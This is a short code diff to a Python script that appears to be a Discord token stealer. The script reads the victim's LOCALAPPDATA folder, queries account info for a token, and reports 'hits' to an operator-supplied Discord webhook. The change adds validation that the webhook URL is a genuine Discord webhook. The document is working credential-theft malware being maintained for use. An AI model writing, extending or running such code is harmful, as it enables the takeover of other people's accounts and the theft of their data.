@@ -3,10 +3,10 @@ import os
 import re
 import json
 import requests
+
+
 # your webhook URL
 WEBHOOK_URL = 'WEBHOOK HERE'
-
-
 # mentions you when you get a hit
 PING_ME = False
 
@@ -30,8 +30,13 @@ def getUserInfo(token):
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}).text)
 
 def main():
+    # check if webhook url was filled in
+    # or is a webhook url
     if WEBHOOK_URL == 'WEBHOOK HERE':
         print("Please add a webhook URL")
+        raise Exception
+    elif not WEBHOOK_URL.startswith('https://discord.com/api/webhooks/'):
+        print("This is not a discord webhook URL")
         raise Exception
 
     local = os.getenv('LOCALAPPDATA')
